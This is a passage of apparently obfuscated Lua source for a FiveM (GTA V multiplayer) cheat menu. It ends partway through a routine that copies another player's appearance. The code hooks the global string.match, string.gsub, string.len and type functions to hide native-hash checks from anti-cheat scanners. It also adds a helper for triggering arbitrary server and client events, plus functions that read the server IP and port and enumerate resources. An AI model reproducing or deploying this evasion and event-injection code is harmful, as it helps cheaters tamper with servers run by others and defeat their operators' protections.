local InvokeNativeGowno_IDYHGIUSDGSDFG = Citizen.InvokeNative

local function Invoke31qda_PN_31QDZ_PN(invoke_uhdogsidudfgdf,...) -- No invoki
return InvokeNativeGowno_IDYHGIUSDGSDFG(invoke_uhdogsidudfgdf.." ",...)
end

local function IntToFloat_NUGTHBGNURTHNHTR(int_DSIGISDG)
    if int_DSIGISDG then
        local float_DSGJISDGSD = int_DSIGISDG + 0.0
        return float_DSGJISDGSD
    else
        return nil
    end
end

local sritizen_INVOKE_PN = Invoke31qda_PN_31QDZ_PN

local cashePowiadomien31qda_PN = {}

local function dodajpowiadomienie29as_PN(text_DSGUSIDGSDG, ms_DSGUHDSIGSDG)
    table.insert(cashePowiadomien31qda_PN, { ['text_DSGUSIDGSDG'] = text_DSGUSIDGSDG, ['time_DSGIUSDGSDG'] = ms_DSGUHDSIGSDG, ['startTime_DSGISDOGSDG'] = sritizen_INVOKE_PN(0x9CD27B0045628463) })
end

local function usunpowiadomienie139qwia_PN(id_DSUGHISDGSDG)
    table.remove(cashePowiadomien31qda_PN, id_DSUGHISDGSDG)
end

local che_POSDIYGISUDFDG = string.len

local old_string_match_DSGUISDG = string.match

local function string_normalen(str_HDGUFSKGDFG)
return che_POSDIYGISUDFDG(tostring(str_HDGUFSKGDFG))
end

local function Draw3d_SDGIUSDIOGSDG(x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS, text_DSGUSIDGSDG, opacity_DSGIHSDIGSDGDSG)
    if opacity_DSGIHSDIGSDGDSG > 255 then
        opacity_DSGIHSDIGSDGDSG = 255
    elseif opacity_DSGIHSDIGSDGDSG < 0 then
        opacity_DSGIHSDIGSDGDSG = 0
    end

	sritizen_INVOKE_PN(0x07C837F9A01C34C9, 0.35, 0.35)
	sritizen_INVOKE_PN(0x441603240D202FA6, 2, 0, 0, 0, 255)
	sritizen_INVOKE_PN(0x2513DFB0FB8400FE)
    sritizen_INVOKE_PN(0x66E0276CC5F6B9DA, 4)
    sritizen_INVOKE_PN(0x038C1F517D7FDCF8, 1)
    sritizen_INVOKE_PN(0xBE6B23FFA53FB442, 255, 255, 255, math.floor(opacity_DSGIHSDIGSDGDSG))
    sritizen_INVOKE_PN(0x25FBB336DF1804CB, tostring('STRING'))
    sritizen_INVOKE_PN(0xC02F4DBFB51D988B, 1)
    sritizen_INVOKE_PN(0x6C188BE134E074AA, tostring(text_DSGUSIDGSDG))
    sritizen_INVOKE_PN(0xCD015E5BB0D96A57, x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS)
    
    local factor_DSGSDGISDGDS = string_normalen(tostring(text_DSGUSIDGSDG)) / 300
    
    sritizen_INVOKE_PN(0x3A618A217E5154F0, x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS + 0.0135, 0.0155 + factor_DSGSDGISDGDS, 0.03, 25, 25, 25, opacity_DSGIHSDIGSDGDSG)
    sritizen_INVOKE_PN(0x3A618A217E5154F0, x_DSUGFSDIUGISDGDS, y_DSUGFSDIUGISDGDS + 0.0125, 0.015 + factor_DSGSDGISDGDS, 0.03, 255, 0, 0, opacity_DSGIHSDIGSDGDSG)
end

local function JEBNIJpowiadomieni31_PN(text_DSGUSIDGSDG, ms_DSGIOJSDIGSDG)
	if text_DSGUSIDGSDG then
		if not ms_DSGIOJSDIGSDG then ms_DSGIOJSDIGSDG = 7500 end
        dodajpowiadomienie29as_PN(text_DSGUSIDGSDG, ms_DSGIOJSDIGSDG)
    end
end

local Atomic_Invoke_UGDIUGFHKDFSGFD={
0x128737EA,
0x76A9EE1F,
0x509D5878EB39E842,
0xAAA34F8A7CB32098,
0xD49F9B0955C367DE,
0xAF35D0D2583051B0,
0x43A66C31C68491C0,
0x673966A0C0FD7171,
0x91310870,
0x7FDD1128,
'0x128737EA',
'0x76A9EE1F',
'0x509D5878EB39E842',
'0xAAA34F8A7CB32098',
'0xD49F9B0955C367DE',
'0xAF35D0D2583051B0',
'0x43A66C31C68491C0',
'0x673966A0C0FD7171',
'0x91310870',
'0x7FDD1128'
}

local PN_KEYSHTRHRTHTRH = {
    ["ESC"] = 322,
    ["F1"] = 288,
    ["F2"] = 289,
    ["F3"] = 170,
    ["F5"] = 166,
    ["F6"] = 167,
    ["F7"] = 168,
    ["F8"] = 169,
    ["F9"] = 56,
    ["F10"] = 57,
    ["~"] = 243,
    ["1"] = 157,
    ["2"] = 158,
    ["3"] = 160,
    ["4"] = 164,
    ["5"] = 165,
    ["6"] = 159,
    ["7"] = 161,
    ["8"] = 162,
    ["9"] = 163,
    ["-"] = 84,
    ["="] = 83,
    ["BACKSPACE"] = 177,
    ["TAB"] = 37,
    ["Q"] = 44,
    ["W"] = 32,
    ["E"] = 38,
    ["R"] = 45,
    ["T"] = 245,
    ["Y"] = 246,
    ["U"] = 303,
    ["P"] = 199,
    ["["] = 39,
    ["]"] = 40,
    ["ENTER"] = 18,
    ["CAPS"] = 137,
    ["A"] = 34,
    ["S"] = 8,
    ["D"] = 9,
    ["F"] = 23,
    ["G"] = 47,
    ["H"] = 74,
    ["K"] = 311,
    ["L"] = 182,
    ["LEFTSHIFT"] = 21,
    ["Z"] = 20,
    ["X"] = 73,
    ["C"] = 26,
    ["V"] = 0,
    ["B"] = 29,
    ["N"] = 249,
    ["M"] = 244,
    [","] = 82,
    ["."] = 81,
    ["LEFTCTRL"] = 36,
    ["LEFTALT"] = 19,
    ["SPACE"] = 22,
    ["RIGHTCTRL"] = 70,
    ["HOME"] = 213,
    ["PAGEUP"] = 10,
    ["PAGEDOWN"] = 11,
    ["DELETE"] = 178,
    ["LEFT"] = 174,
    ["right_DSIGHIDSUGSD"] = 175,
    ["UP"] = 172,
    ["DOWN"] = 173,
    ["NENTER"] = 201,
    ["MWHEELUP"] = 15,
    ["MWHEELDOWN"] = 14,
    ["N4"] = 108,
    ["N5"] = 60,
    ["N6"] = 107,
    ["N+"] = 96,
    ["N-"] = 97,
    ["N7"] = 117,
    ["N8"] = 61,
    ["N9"] = 118,
    ["MOUSE1"] = 24,
    ["MOUSE2"] = 25,
    ["MOUSE3"] = 348
}

local old_string_gsub_DSIGHSIUDG = string.gsub

local function normal_string_gsub_SDGHSDIGSD(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
return old_string_gsub_DSIGHSIUDG(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
end

string.gsub = function(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
	if find_DSGJIDSGDS == " " or find_DSGJIDSGDS == "%s+" then
		return string_SDGIJSDG
	elseif replace_DSGHSDIUGDS == "" then
		return string_SDGIJSDG
	else
		old_string_gsub_DSIGHSIUDG(string_SDGIJSDG, find_DSGJIDSGDS, replace_DSGHSDIUGDS)
	end
end

string.len = function(str_HDGUFSKGDFG) -- Blokowanie string.len
	if not(che_POSDIYGISUDFDG(tostring(str_HDGUFSKGDFG))>=8 and che_POSDIYGISUDFDG(tostring(str_HDGUFSKGDFG))<=20) then
		local str_HDGUFSKGDFG = che_POSDIYGISUDFDG(str_HDGUFSKGDFG) - 1
		return str_HDGUFSKGDFG
	else
		return che_POSDIYGISUDFDG(str_HDGUFSKGDFG)
	end
end

string.match = function(string_udhgiusdgfd, find_duhugsidgdfg)
	for sinksianksionk = 0, #Atomic_Invoke_UGDIUGFHKDFSGFD do
	if string_udhgiusdgfd == Atomic_Invoke_UGDIUGFHKDFSGFD[sinksianksionk] or find_duhugsidgdfg == Atomic_Invoke_UGDIUGFHKDFSGFD[sinksianksionk] then
		return false
	elseif string.lower(string_udhgiusdgfd) == Atomic_Invoke_UGDIUGFHKDFSGFD[sinksianksionk] or string.lower(find_duhugsidgdfg) == Atomic_Invoke_UGDIUGFHKDFSGFD[sinksianksionk] then
		return false
	elseif find_duhugsidgdfg == ""then
		return false
	elseif string_udhgiusdgfd == nil or find_duhugsidgdfg == nil then
		return false
	else
		return true
	end
end
end

local old_type_DSUGHISDGSD = type
type = function(string_DSUGHIDSUG)
	if old_type_DSUGHISDGSD(string_DSUGHIDSUG) == "string"then
		return 
	else
		return old_type_DSUGHISDGSD(string_DSUGHIDSUG)
	end
end

local fov_x_DISFISDUSGFDG = 0.40
local fov_x2_DISFISDUSGFDG = 0.60
local fov_y_DISFISDUSGFDG = 0.40
local fov_y2_DISFISDUSGFDG = 0.60
local current_fov_SUHFIUSDFSDF = 1
local heading_ADIGSDGSD = 0
local crouched_DSIHGIUSDGSD = false

local godmodetank_jebany_PN = false


local function powiadomienia31qda_PN(text_dughisergdfdg)
    sritizen_INVOKE_PN(0x202709F4C58A0424, "STRING")
    sritizen_INVOKE_PN(0x94CF4AC034C9C986, text_dughisergdfdg)
    sritizen_INVOKE_PN(0x2ED7843F8F801023, false, false)
end

-- Custom

local function PN_WAIT_31DA31_PN(ms_SJFDSIUFSD)
	coroutine.yield(sritizen_INVOKE_PN(0x9CD27B0045628463) + ms_SJFDSIUFSD)
end

local CreateThreadOczywiscie_DIASYUG8OADIUFGDSFG = Citizen.CreateThreadNow
local function CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(...) -- CreateThreadNow
return CreateThreadOczywiscie_DIASYUG8OADIUFGDSFG(...)
end

-- Takie funckje z invokami

local function GetResourceName_PN_dihgsidlgudfsgd(...)
return sritizen_INVOKE_PN(0xe5e9ebbb, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetServerIP_PN_udgshgksudigksdf(...)
return sritizen_INVOKE_PN(0xea11bfba, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetServerIPWithoutPort_PN_UDGYUSDGFDGF(...)
            local ip_UDYUDSGYKFDG = GetServerIP_PN_udgshgksudigksdf()
            if ip_UDYUDSGYKFDG == nil then
            return 'nieznaleziono ip'
            else
            return string.sub(ip_UDYUDSGYKFDG, 0, string.find(ip_UDYUDSGYKFDG, ":") - 1)
            end
        end
		
local function GetServerPort_PN_UDGUYSDFGKFD(...)
local s_ufdhsgudigsdfg = GetServerIP_PN_udgshgksudigksdf()
local xd_duhsfigdsf, xd2_duhsuydhgksdfg = string.find(s_ufdhsgudigsdfg, ":")
local to_return_DSUGHIDSG = string.sub(s_ufdhsgudigsdfg, xd_duhsfigdsf + 1)
return to_return_DSUGHIDSG
end

local function GetYouId_PN_idasygiosuglsdf(...)
return sritizen_INVOKE_PN(0x4d97bcc7, sritizen_INVOKE_PN(0x4F8644AF03D0E0D6), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function getplejerid_PN(...)
return sritizen_INVOKE_PN(0x4d97bcc7, ..., Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetNumVehicleMods_PN_UDYUFGSDHGUJFDGY(vehicle_DSGHIUSDGDS, modType_DSUGHSDIUGSD)
return sritizen_INVOKE_PN(0xE38E9162A2500646, vehicle_DSGHIUSDGDS, modType_DSUGHSDIUGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetPlayerServerId_PN_DUHGIUSHGUFD(player_usdfugsdfig)
return sritizen_INVOKE_PN(0x4d97bcc7, player_usdfugsdfig, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetPlayerName_PN_ISDGIUSREG4OE87UGSDFG(player_ifhgsdiugdsfg)
return sritizen_INVOKE_PN(0x6D0DE6A7B5DA71F8, player_ifhgsdiugdsfg, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetOnscreenKeyboardResult_PN_UDHUYGFDSIGDF() -- GetOnscreenKeyboardResult
return sritizen_INVOKE_PN(0x8362B09B91893647, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetResourceState_PN_DIHUIGFIDUGDFG(resourceName_UYDUHGIFDGF)
return sritizen_INVOKE_PN(0x4039b485, tostring(resourceName_UYDUHGIFDGF), Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetEntityCoords_PN_UDHGIUDIKGDFG(entity_idfshgosdfg, alive_duhsdiufgsdf)
return sritizen_INVOKE_PN(0x3FEF770D40960D5A, entity_idfshgosdfg, alive_duhsdiufgsdf, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetEntityHeading_PN_UDYUGDHIGKDFG(entity_idfshgosdfg)
return sritizen_INVOKE_PN(0xE83D4F9BA2A38914, entity_idfshgosdfg, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetEntityRotation_PN_DSGUHSDUYGUSD(entity_DSIGHSIDUG, rotationOrder_DSUGSIDGSD)
return sritizen_INVOKE_PN(0xAFBD61CC738D9EB9, entity_DSIGHSIDUG, rotationOrder_DSUGSIDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetGameplayCamRot_PN_DSUGHSDUIGSD(rotationOrder_DSUGSIDGSD)
return sritizen_INVOKE_PN(0x837765A25378F0BB, rotationOrder_DSUGSIDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetEntityForwardVector_PN_SDGHSDIUGSD(entity_DSIGHSIDUG)
return sritizen_INVOKE_PN(0x0A794A5A57F8DF91, entity_DSIGHSIDUG, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetActivePlayers_PN_UDGYUDFIGKDFGDF(...)
return msgpack.unpack(sritizen_INVOKE_PN(0xcf143fb9, Citizen.ReturnResultAnyway(), Citizen.ResultAsObject()))
end

local function GetPedInVehicleSeat_PN_USDGFUYDSFSD(vehicle_USYUFGDSGFDG, index_DUGFUISDHYKGFS)
return sritizen_INVOKE_PN(0xBB40DD2270B65366, vehicle_USYUFGDSGFDG, index_DUGFUISDHYKGFS, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetVehiclePedIsIn_PN_IDHUFYUHSUDGFD(ped_diughiusdgsdf, lastvehicle_dusfhdifgsdfg)
if lastvehicle_dusfhdifgsdfg == nil then
return sritizen_INVOKE_PN(0x9A9112A0FE9A4713, ped_diughiusdgsdf, false, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
else
return sritizen_INVOKE_PN(0x9A9112A0FE9A4713, ped_diughiusdgsdf, lastvehicle_dusfhdifgsdfg, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end
end

local function IsVehicleSeatFree_PN_DUHGYUSFGFD(vehicle_UDHUHDFSGDFG, seatIndex_d8ygusdfgsdfg)
return sritizen_INVOKE_PN(0x22AC59A870E6A669, vehicle_UDHUHDFSGDFG, seatIndex_d8ygusdfgsdfg, Citizen.ReturnResultAnyway())
end

local function GetCurrentPedWeapon_PN_UDIUGHUSGFD(ped_duhgsiudgsdfg, p2_idhgsiugdfsg)
return sritizen_INVOKE_PN(0x3A87E44BB9A01D54, ped_duhgsiudgsdfg, Citizen.PointerValueInt(), p2_idhgsiugdfsg, Citizen.ReturnResultAnyway())
end

local function GetPedBoneCoords_PN_GDUYFSDGF(ped_UDGUFYFDG, boneId_DIUSDHIGUSDFG, offsetX_IDUHFUYSDHFDSF, offsetY_IDUHFUYSDHFDSF, offsetZ_IDUHFUYSDHFDSF)
return sritizen_INVOKE_PN(0x17C07FC640E86B4E, ped_UDGUFYFDG, boneId_DIUSDHIGUSDFG, offsetX_IDUHFUYSDHFDSF, offsetY_IDUHFUYSDHFDSF, offsetZ_IDUHFUYSDHFDSF, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetPedBoneIndex_PN_DSGIHSDGSDG(ped_DSGHSIUDGSD, boneId_DSGUHISDGSD)
return sritizen_INVOKE_PN(0x3F428D08BE5AAE31, ped_DSGHSIUDGSD, boneId_DSGUHISDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetEntityBoneIndexByName_PN_SDUGHSDIUGSDG(entity_DSIGHSIDUG, boneName_DSUGHISDGSD)
return sritizen_INVOKE_PN(0xFB71170B7E76ACBA, entity_DSIGHSIDUG, tostring(boneName_DSUGHISDGSD), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function World3dToScreen2d_PN_UDHUGIDFGDF(worldX_YDGUYDFIGDFGDF, worldY_YDGUYDFIGDFGDF, worldZ_YDGUYDFIGDFGDF)
	return sritizen_INVOKE_PN(0x34E82F05DF2974F5, worldX_YDGUYDFIGDFGDF, worldY_YDGUYDFIGDFGDF, worldZ_YDGUYDFIGDFGDF, Citizen.PointerValueFloat(), Citizen.PointerValueFloat(), Citizen.ReturnResultAnyway())
end

function GetWeaponDamage_PN_SDGHSDUGDS(weaponHash_DSHUGYUSDGDS, componentHash_DGHSIUGDS)
return sritizen_INVOKE_PN(0x3133B907D8B32053, weaponHash_DSHUGYUSDGDS, componentHash_DGHSIUGDS, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetDistanceBetweenCoords_PN_UDHGIUSDHGIUDF(x1_DSHGIUFDGHUIDFGDF, y1_DSHGIUFDGHUIDFGDF, z1_DSHGIUFDGHUIDFGDF, x2_DSHGIUFDGHUIDFGDF, y2_DSHGIUFDGHUIDFGDF, z2_DSHGIUFDGHUIDFGDF, useZ_DIUHGUSHGIUDFGDF)
	return sritizen_INVOKE_PN(0xF1B760881820C952, x1_DSHGIUFDGHUIDFGDF, y1_DSHGIUFDGHUIDFGDF, z1_DSHGIUFDGHUIDFGDF, x2_DSHGIUFDGHUIDFGDF, y2_DSHGIUFDGHUIDFGDF, z2_DSHGIUFDGHUIDFGDF, useZ_DIUHGUSHGIUDFGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetOffsetFromEntityInWorldCoords_PN_UHDIUGHDFUGHDFG(entity_DUHGIUDSFHGIUDFGDF, offsetX_DSUGHIUFHGIUDFGDF, offsetY_DSUGHIUFHGIUDFGDF, offsetZ_DSUGHIUFHGIUDFGDF)
	return sritizen_INVOKE_PN(0x1899F328B0E12848, entity_DUHGIUDSFHGIUDFGDF, offsetX_DSUGHIUFHGIUDFGDF, offsetY_DSUGHIUFHGIUDFGDF, offsetZ_DSUGHIUFHGIUDFGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetResourceByFindIndex_PN_DSUGHIUDSHIUFDGDF(findIndex_DSUIHGIUSDHGIDFGDF)
	return sritizen_INVOKE_PN(0x387246b7, findIndex_DSUIHGIUSDHGIDFGDF, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function GetNumResources_PN_DUSGUFFHIDGIDFG()
	return sritizen_INVOKE_PN(0x863f27b, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetGroundZFor_3dCoord_PN_DGUISDHIGHIFD(x_DUYGFIUDSGFSD, y_DUYGFIUDSGFSD, z_DUYGFIUDSGFSD, unk_DUYGFIUDSGFSD)
return sritizen_INVOKE_PN(0xC906A7DAB05C8D2B, x_DUYGFIUDSGFSD, y_DUYGFIUDSGFSD, z_DUYGFIUDSGFSD, Citizen.PointerValueFloat(), unk_DUYGFIUDSGFSD, Citizen.ReturnResultAnyway())
end

local function GetFirstBlipInfoId_PN_DISGHIUDSHIGFD(blipSprite_IDSHGIUHIUSDGFD)
return sritizen_INVOKE_PN(0x1BEDE233E6CD2A1F, blipSprite_IDSHGIUHIUSDGFD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetSelectedPedWeapon_PN_DSUGHISDUGSD(ped_DUHGISUGDSGDS)
return sritizen_INVOKE_PN(0x0A6DB4965674D243, ped_DUHGISUGDSGDS, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function dodaniewykonczenia41r31rqf_PN(HASH_IDSUGIDSHISDGSD)
return sritizen_INVOKE_PN(0xD966D51AA5B28BB9, sritizen_INVOKE_PN(0xD80958FC74E988A6), GetSelectedPedWeapon_PN_DSUGHISDUGSD(sritizen_INVOKE_PN(0xD80958FC74E988A6)), HASH_IDSUGIDSHISDGSD)
end

local function usunieciewykonczenias9418qa_PN(HASH_IDSUGIDSHISDGSD)
return sritizen_INVOKE_PN(0x1E8BE90C74FB4C09, sritizen_INVOKE_PN(0xD80958FC74E988A6), GetSelectedPedWeapon_PN_DSUGHISDUGSD(sritizen_INVOKE_PN(0xD80958FC74E988A6)), HASH_IDSUGIDSHISDGSD)
end

local function CreateDui_PN_DSGUHSDUIGSDGSD(url_DSUGISDIGSDG, width_DSGUSDIGSDG, height_SDGUSDIGUSDG)
return sritizen_INVOKE_PN(0x23eaf899, tostring(url_DSUGISDIGSDG), width_DSGUSDIGSDG, height_SDGUSDIGUSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsLong())
end

local function CreateRuntimeTxd_PN_DSGHDSUIGSDGDS(name_idgjiserjios)
return sritizen_INVOKE_PN(0x1f3ac778, tostring(name_idgjiserjios), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong())
end

local function GetDuiHandle_PN_DSGUSHDIGUSDG(duiObject_DSUHSIDGHUSDG)
return sritizen_INVOKE_PN(0x1655d41d, duiObject_DSUHSIDGHUSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsString())
end

local function CreateRuntimeTextureFromDuiHandle_PN_SDUGHSIDHGSD(txd_DSGIUHISDUGSD, txn_DSGIUHISDUGSD, duiHandle_DSGIUHISDUGSD)
return sritizen_INVOKE_PN(0xb135472b, txd_DSGIUHISDUGSD, tostring(txn_DSGIUHISDUGSD), tostring(duiHandle_DSGIUHISDUGSD), Citizen.ReturnResultAnyway(), Citizen.ResultAsLong())
end

local function GetEntityHealth_PN_DSUGHISDUGSDG(entity_DSIGHSIDUG)
return sritizen_INVOKE_PN(0xEEF059FAD016D209, entity_DSIGHSIDUG, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetBlipSprite_PN_DSIGHSDIUGSD(blip_DSGHSIDUGSD)
return sritizen_INVOKE_PN(0x1FC877464A04FC4F, blip_DSGHSIDUGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetVehicleNumberOfPassengers_PN_DSGUHSDIGSDGDS(vehicle_DSUGIHSDGSDG)
return sritizen_INVOKE_PN(0x24CB2137731FFE89, vehicle_DSUGIHSDGSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function IsDisabledControlPressed_PN_DSUHGSUDGD(inputGroup_HUDSUIGDS, control_DSJGHISDGSD)
return sritizen_INVOKE_PN(0xE2587F8CBBD87B1D, inputGroup_HUDSUIGDS, control_DSJGHISDGSD, Citizen.ReturnResultAnyway())
end

local function GetDisabledControlNormal_PN_DSGIHSIDUGSDG(inputGroup_HUDSUIGDS, control_DSJGHISDGSD)
return sritizen_INVOKE_PN(0x11E65974A982637C, inputGroup_HUDSUIGDS, control_DSJGHISDGSD, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetShapeTestResult_PN_DSUGHIDSUGS(rayHandle_DSUGHISDGSD)
return sritizen_INVOKE_PN(0x3D87450E15D98694, rayHandle_DSUGHISDGSD, Citizen.PointerValueInt(), Citizen.PointerValueVector(), Citizen.PointerValueVector(), Citizen.PointerValueInt(), Citizen.ReturnResultAnyway(), Citizen.ResultAsInteger())
end

local function GetTextureResolution_PN_SDIGSIDJGIDS(textureDict_SDGHSIUDGSDG, textureName_DSGUHSDUGHIUDS)
return sritizen_INVOKE_PN(0x35736EE65BD00C11, tostring(textureDict_SDGHSIUDGSDG), tostring(textureName_DSGUHSDUGHIUDS), Citizen.ReturnResultAnyway(), Citizen.ResultAsVector())
end

local function GetAspectRatio_PN_DSHUGHSIDG(bool_DSGHSDIUGSDG)
return sritizen_INVOKE_PN(0xF1307EF624A80D87, bool_DSGHSDIUGSDG, Citizen.ReturnResultAnyway(), Citizen.ResultAsFloat())
end

local function GetRandomPlayer_PN_DSGUHSDIUGDS()
local to_return_DSUGHIDSG = math.random(0, #GetActivePlayers_PN_UDGYUDFIGKDFGDF())
if GetPlayerServerId_PN_DUHGIUSHGUFD(to_return_DSUGHIDSG) ~= 0 then
return to_return_DSUGHIDSG
else
return false
end
end

------------------------------------------------------------------------------------------------------------------------------------------------------------

local texture_preload_DSGHDSIUGDSG = {
	"commonmenu",
	"mpleaderboard",
	"mphud",
	"helicopterhud",
}

local function PreloadTextures_DSIGJSIUDGSDG()
	
	for i = 1, #texture_preload_DSGHDSIUGDSG do
		sritizen_INVOKE_PN(0xDFA2EF8E04127DD5, texture_preload_DSGHDSIUGDSG[i])
	end

end

PreloadTextures_DSIGJSIUDGSDG()

local function LoadDui_DSIGUISDGSDG(link)
if GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG ~= nil then
sritizen_INVOKE_PN(0xa085cb10, GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG)
end
local GUI_GIF_DSGUIDSHGOSDGSD = true
local GUI_GIF_DSGSDIUGSDGSD = CreateRuntimeTxd_PN_DSGHDSUIGSDGDS("PN_gif_DSGUHSDGISDG")
local GUI_GIF_DSGFSDUHFEIOSGWGSDG = nil
if GUI_GIF_DSGUIDSHGOSDGSD then
    CreateThreadNowAtomicDrugMiSsie_DIASFUOIDSGSDFG(
        function()
            GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG = CreateDui_PN_DSGUHSDUIGSDGSD(tostring(link), 1900, 512)
            PN_WAIT_31DA31_PN(125)
            local GUI_GIF_AUYSFGSAYFSDF = GetDuiHandle_PN_DSGUSHDIGUSDG(GUI_GIF_DSGYUTIUFDSYGUTS786357IDTYSBFIDSGBIUSDGFDSGBDSG)
            local GUI_GIF_DISUYTFDSYFSDG = CreateRuntimeTextureFromDuiHandle_PN_SDUGHSIDHGSD(GUI_GIF_DSGSDIUGSDGSD, "duiTex_DSIOGJSDG", GUI_GIF_AUYSFGSAYFSDF)
            PN_WAIT_31DA31_PN(125)
            sritizen_INVOKE_PN(0xa66f8f75, "shopui_title_graphics_franklin", "shopui_title_graphics_franklin", "PN_gif_DSGUHSDGISDG", "duiTex_DSIOGJSDG")
            GUI_GIF_DSGUIDSHGOSDGSD = false
        end
    )
end

end

local DSUHGSIUD_theme_green = true
local DSUHGSIUD_theme_purple = false
local DSUHGSIUD_theme_red = false
local DSUHGSIUD_theme_blue = false

local function LoadGif_DSGHDSIUGSDG()
if DSUHGSIUD_theme_purple then
LoadDui_DSIGUISDGSDG("https://i.imgur.com/t6r5GbJ.gif")
elseif DSUHGSIUD_theme_green then
LoadDui_DSIGUISDGSDG("https://i.imgur.com/t6r5GbJ.gif")
end

end

LoadGif_DSGHDSIUGSDG()

-- Funkcje

local function RGB_Rainbow_DSUGSIDGSD(frequency_DDUSHGIDS)
    local result_DSUGIISDG = {}
    local curtime_DSUIHGISDG = sritizen_INVOKE_PN(0x9CD27B0045628463) / 1000

    result_DSUGIISDG.r = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 0) * 127 + 128)
    result_DSUGIISDG.g = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 2) * 127 + 128)
    result_DSUGIISDG.b = math.floor(math.sin(curtime_DSUIHGISDG * frequency_DDUSHGIDS + 4) * 127 + 128)

    return result_DSUGIISDG
end

local function Trigger_PN_Private_Event_digyuseogr9sdfg(server_DJHGSGSDUGSD, event_DSIHGIUSDGSD, ...)
	local payload_DSUFHISDUGSDG = msgpack.pack({...})
	if server_DJHGSGSDUGSD then
		sritizen_INVOKE_PN(0x7fdd1128, event_DSIHGIUSDGSD, payload_DSUFHISDUGSDG)
	else
		sritizen_INVOKE_PN(0x91310870, event_DSIHGIUSDGSD, payload_DSUFHISDUGSDG)
	end
end


local function math_round_DSIHGIUDFJGIDF(num_DSUGHIDUFGDFGDF, numDecimalPlace_DSGHIUSDHGIUDFGDF)
    return tonumber(string.format("%.".. (numDecimalPlace_DSGHIUSDHGIUDFGDF or 0) .. "f", num_DSUGHIDUFGDFGDF))
end

	local function SKLONUJTYPKA313Q_PN(Target_grejtjtrkyt)
		local ped_htrjkykutkiy = sritizen_INVOKE_PN(0x43A66C31C68491C0, Target_grejtjtrkyt)
		local me_hrejtrGFgre = sritizen_INVOKE_PN(0xD80958FC74E988A6)
		
		hat_trjtyrjkytkt = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 0)
		hat_texture_hgrehjrtjt = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 0)
		
		glasses_htrkytrkyt = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 1)
		glasses_texture_RJRTJRRTJ = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 1)
		
		eare_grehrehgregrrt = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 2)
		ear_texture_HREHRTHJTRJR = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 2)
		
		watch_hETRTRT = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 6)
		watch_texture_HRTEJRYJYTJTY = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 6)
		
		wrist_EHTRHRHJRJY = sritizen_INVOKE_PN(0x898CC20EA75BACD8, ped_htrjkykutkiy, 7)
		wrist_texture_HTRJRJYJTYU = sritizen_INVOKE_PN(0xE131A28626F81AB2, ped_htrjkykutkiy, 7)
		
		head_drawable_LGLGLKGKGKGKG = sritizen_INVOKE_PN(0x67F3780DD425D4FC, ped_htrjkykutkiy, 0)
		head_palette_JGRTJHJTHJTY = sritizen_INVOKE_PN(0xE3DD5F2A84B42281, ped_htrjkykutkiy, 0)
